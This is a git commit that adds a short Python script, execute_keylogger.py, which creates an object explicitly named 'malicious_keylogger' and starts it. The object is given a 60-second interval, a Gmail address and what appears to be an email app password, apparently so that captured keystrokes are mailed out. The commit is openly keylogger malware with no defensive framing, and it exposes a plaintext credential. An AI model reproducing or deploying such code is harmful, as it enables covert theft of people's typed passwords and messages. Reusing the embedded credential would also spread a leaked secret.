6da27c5a6575bb05bf2a191d8427a854eabc23df
Pavan <116935533+Pavan583@users.noreply.github.com>
2024-01-22 19:58:11 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,13 @@
+
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'pavansagar052@gmail.com', 'atuecamblpecgczt')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
